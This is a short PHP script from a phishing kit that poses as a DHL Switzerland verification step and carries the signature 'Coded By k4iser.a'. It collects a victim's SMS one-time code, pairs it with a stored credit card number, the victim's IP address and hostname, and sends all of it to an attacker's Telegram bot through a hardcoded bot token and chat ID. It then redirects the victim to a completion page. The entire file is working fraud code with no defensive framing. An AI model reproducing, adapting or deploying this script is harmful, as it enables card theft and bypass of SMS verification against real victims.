<?php

session_start();

$sms=$_POST["sms"];

$rand=rand(1000000,999999999).rand(1000000,999999999);
$rand2=base64_encode($rand);
	

        $_SESSION['sms'] = $sms;




$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "~ Coded By k4iser.a  ~\n";
$message .= "|----------|SMS 2 DHL-CH |----------|\n";
$message .= "CREDIT CARD    : ".$_SESSION['cc']."\n";
$message .= "SMS 2  : ".$_SESSION['sms']."\n";
$message .= "|------------------+|IP|-------------------|\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Hostname  : ".$hostname."\n";
$subject = "~ <Rslt-DHL-CH>- Coded By k4iser.a ~ | $ip";


$token = "6971582979:AAHB7TR8g8yOihvuVlXsOlTJfvepzv3JBD0";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=6413015802&text=" . urlencode($message)."" );
	
header("location:done.php?vc?__event=card&service_id=top_card=AU")
?>